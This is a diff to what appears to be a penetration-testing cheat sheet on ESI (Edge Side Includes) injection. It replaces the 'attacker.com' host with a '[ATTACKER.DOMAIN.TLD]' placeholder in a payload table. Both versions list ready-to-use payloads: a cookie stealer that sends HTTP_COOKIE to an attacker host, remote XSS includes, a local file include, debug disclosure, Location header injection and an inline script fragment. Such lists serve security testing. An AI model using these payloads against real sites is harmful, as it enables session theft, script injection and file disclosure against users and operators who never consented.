@@ -48,12 +48,12 @@ Surrogate-Control: content="ESI/1.0"
 
 | Description             | Payload                                  |
 | ----------------------- | ---------------------------------------- |
-| Blind detection         | `<esi:include src=http://attacker.com>`  |
-| XSS                     | `<esi:include src=http://attacker.com/XSSPAYLOAD.html>` |
-| Cookie stealer          | `<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>` |
+| Blind detection         | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]>`  |
+| XSS                     | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/XSSPAYLOAD.html>` |
+| Cookie stealer          | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/?cookie_stealer.php?=$(HTTP_COOKIE)>` |
 | Include a file          | `<esi:include src="supersecret.txt">` |
 | Display debug info      | `<esi:debug/>` |
-| Add header              | `<!--esi $add_header('Location','http://attacker.com') -->` |
+| Add header              | `<!--esi $add_header('Location','http://[ATTACKER.DOMAIN.TLD]') -->` |
 | Inline fragment         | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |
 
 | Software | Includes | Vars | Cookies | Upstream Headers Required | Host Whitelist |
